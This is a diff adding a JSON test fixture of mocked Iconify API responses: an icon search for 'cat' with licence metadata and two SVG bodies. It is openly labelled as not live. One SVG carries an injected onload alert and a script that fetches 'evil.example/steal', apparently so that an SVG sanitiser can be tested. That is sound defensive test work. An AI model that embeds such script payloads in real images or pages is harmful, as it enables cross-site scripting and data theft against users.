@@ -1,0 +1,231 @@
+{
+ "_meta": {
+  "recorded_live": false,
+  "kind": "fixture shaped after the documented response schema; not a live recording",
+  "why": "the official APIs are unreachable from the cloud container (proxy 403, see docs/mag/phase-0/evidence/licence_verification_2026-10-11.md)",
+  "re_record": "pending on-device: Proof Runner step 'shapes.discovery.record' re-records these from the operator's PC and the suite must still pass",
+  "schema_sources": {
+   "search": "iconify/api src/types/server/v2.ts APIv2SearchResponse (icons,total,limit,start,collections,request)",
+   "collections": "IconifyInfo license.{title,spdx,url}, author.{name,url}, version (licence_verification_2026-10-11 row 1)"
+  }
+ },
+ "interactions": [
+  {
+   "request": {
+    "method": "GET",
+    "url": "https://api.iconify.design/search?query=cat&limit=32"
+   },
+   "response": {
+    "status": 200,
+    "json": {
+     "icons": [
+      "tabler:cat",
+      "twemoji:cat-face",
+      "openmoji:cat",
+      "simple-icons:catppuccin",
+      "ri:bear-smile-line",
+      "game-icons:cat",
+      "circum:cat",
+      "ps:cat",
+      "noto:cat",
+      "mdi:cat",
+      "unknownset:cat"
+     ],
+     "total": 11,
+     "limit": 32,
+     "start": 0,
+     "collections": {
+      "tabler": {
+       "name": "Tabler Icons",
+       "total": 100,
+       "author": {
+        "name": "Paweł Kuna",
+        "url": "https://github.com/tabler/tabler-icons"
+       },
+       "license": {
+        "title": "MIT",
+        "spdx": "MIT",
+        "url": "https://github.com/tabler/tabler-icons/blob/master/LICENSE"
+       },
+       "category": "General",
+       "palette": false
+      },
+      "twemoji": {
+       "name": "Twitter Emoji",
+       "total": 100,
+       "author": {
+        "name": "Twitter",
+        "url": "https://github.com/twitter/twemoji"
+       },
+       "license": {
+        "title": "CC BY 4.0",
+        "spdx": "CC-BY-4.0",
+        "url": "https://creativecommons.org/licenses/by/4.0/"
+       },
+       "category": "General",
+       "palette": false
+      },
+      "openmoji": {
+       "name": "OpenMoji",
+       "total": 100,
+       "author": {
+        "name": "OpenMoji",
+        "url": "https://github.com/hfg-gmuend/openmoji"
+       },
+       "license": {
+        "title": "CC BY-SA 4.0",
+        "spdx": "CC-BY-SA-4.0",
+        "url": "https://creativecommons.org/licenses/by-sa/4.0/"
+       },
+       "category": "General",
+       "palette": false
+      },
+      "simple-icons": {
+       "name": "Simple Icons",
+       "total": 100,
+       "author": {
+        "name": "Simple Icons Collaborators",
+        "url": "https://github.com/simple-icons/simple-icons"
+       },
+       "license": {
+        "title": "CC0 1.0",
+        "spdx": "CC0-1.0",
+        "url": "https://github.com/simple-icons/simple-icons/blob/develop/LICENSE.md"
+       },
+       "category": "General",
+       "palette": false
+      },
+      "ri": {
+       "name": "Remix Icon",
+       "total": 100,
+       "author": {
+        "name": "Remix Design",
+        "url": "https://github.com/Remix-Design/RemixIcon"
+       },
+       "license": {
+        "title": "Apache 2.0",
+        "spdx": "Apache-2.0",
+        "url": "https://github.com/Remix-Design/RemixIcon/blob/master/License"
+       },
+       "category": "General",
+       "palette": false,
+       "version": "4.8.0"
+      },
+      "game-icons": {
+       "name": "Game Icons",
+       "total": 100,
+       "author": {
+        "name": "GameIcons",
+        "url": "https://github.com/game-icons/icons"
+       },
+       "license": {
+        "title": "CC BY 3.0",
+        "spdx": "CC-BY-3.0",
+        "url": "https://github.com/game-icons/icons/blob/master/license.txt"
+       },
+       "category": "General",
+       "palette": false
+      },
+      "circum": {
+       "name": "Circum Icons",
+       "total": 100,
+       "author": {
+        "name": "Klarr Agency",
+        "url": "https://circumicons.com/"
+       },
+       "license": {
+        "title": "Mozilla Public License 2.0",
+        "spdx": "MPL-2.0",
+        "url": "https://github.com/Klarr-Agency/Circum-Icons/blob/main/LICENSE"
+       },
+       "category": "General",
+       "palette": false
+      },
+      "ps": {
+       "name": "PrestaShop Icons",
+       "total": 100,
+       "author": {
+        "name": "PrestaShop",
+        "url": "https://github.com/PrestaShop/prestashop-icon-font"
+       },
+       "license": {
+        "title": "CC BY-NC 4.0",
+        "spdx": "CC-BY-NC-4.0",
+        "url": "https://creativecommons.org/licenses/by-nc/4.0/"
+       },
+       "category": "General",
+       "palette": false
+      },
+      "noto": {
+       "name": "Noto Emoji",
+       "total": 100,
+       "author": {
+        "name": "Google Inc",
+        "url": "https://github.com/googlefonts/noto-emoji"
+       },
+       "license": {
+        "title": "Apache 2.0",
+        "spdx": "Apache-2.0",
+        "url": "https://github.com/googlefonts/noto-emoji/blob/main/svg/LICENSE"
+       },
+       "category": "General",
+       "palette": false
+      },
+      "mdi": {
+       "name": "Material Design Icons",
+       "total": 100,
+       "author": {
+        "name": "Pictogrammers",
+        "url": "https://github.com/Templarian/MaterialDesign"
+       },
+       "license": {
+        "title": "Apache 2.0",
+        "spdx": "Apache-2.0",
+        "url": "https://github.com/Templarian/MaterialDesign/blob/master/LICENSE"
+       },
+       "category": "General",
+       "palette": false
+      },
+      "unknownset": {
+       "name": "No licence field",
+       "total": 1,
+       "author": {
+        "name": "?"
+       }
+      }
+     },
+     "request": {
+      "query": "cat",
+      "limit": "32"
+     }
+    }
+   }
+  },
+  {
+   "request": {
+    "method": "GET",
+    "url": "https://api.iconify.design/tabler/cat.svg"
+   },
+   "response": {
+    "status": 200,
+    "headers": {
+     "Content-Type": "image/svg+xml"
+    },
+    "body_text": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" onload=\"alert(1)\"><script>fetch(\"https://evil.example/steal\")</script><path fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" d=\"M20 3v10a8 8 0 1 1-16 0V3l3.01 3.393M4 3l3.003 3.4A8 8 0 0 1 12 5c1.78 0 3.4.57 4.7 1.55L20 3\"/><path fill=\"#000\" d=\"M9 12a1 1 0 1 0 0.01 0zM15 12a1 1 0 1 0 0.01 0z\"/></svg>"
+   }
+  },
+  {
+   "request": {
+    "method": "GET",
+    "url": "https://api.iconify.design/twemoji/cat-face.svg"
+   },
+   "response": {
+    "status": 200,
+    "headers": {
+     "Content-Type": "image/svg+xml"
+    },
+    "body_text": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"36\" height=\"36\" viewBox=\"0 0 36 36\"><path fill=\"#FFCC4D\" d=\"M36 18c0 9.941-8.059 18-18 18S0 27.941 0 18S8.059 0 18 0s18 8.059 18 18\"/><ellipse cx=\"11.5\" cy=\"13.5\" rx=\"2.5\" ry=\"3.5\" fill=\"#664500\"/><ellipse cx=\"24.5\" cy=\"13.5\" rx=\"2.5\" ry=\"3.5\" fill=\"#664500\"/></svg>"
+   }
+  }
+ ]
+}
